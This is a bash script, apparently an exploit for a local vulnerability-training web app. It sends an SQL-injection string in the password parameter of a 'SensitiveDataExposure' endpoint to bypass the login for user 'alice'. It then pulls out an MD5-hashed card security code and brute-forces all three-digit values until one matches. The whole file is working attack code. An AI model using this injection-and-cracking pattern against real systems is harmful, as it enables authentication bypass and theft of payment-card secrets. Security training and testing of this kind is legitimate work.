#!/bin/bash

source ./common.sh

LOGIN="alice"

ALPHABET="{0..9}"

CHECKSUM="$(curl -k -X GET "https://localhost:5001/SL/SensitiveDataExposure?cardprop=secno&name=$LOGIN&pw=%27%20or%201%20%3D%201%20or%20%27" 2>&1 \
    | htmldecode | egrep -o "card-number is '.*'" | cut -d ' ' -f 3 | tr -d \')"

for SECCODE in $(getchar "3")
do
    HASHED=$(echo $SECCODE | md5sum | cut -d ' ' -f 1)
    [ "$HASHED" = "$CHECKSUM" ] && {
        echo "Inferred security code '$SECCODE' for user '$LOGIN'"
        exit 0
    }
done

exit 1
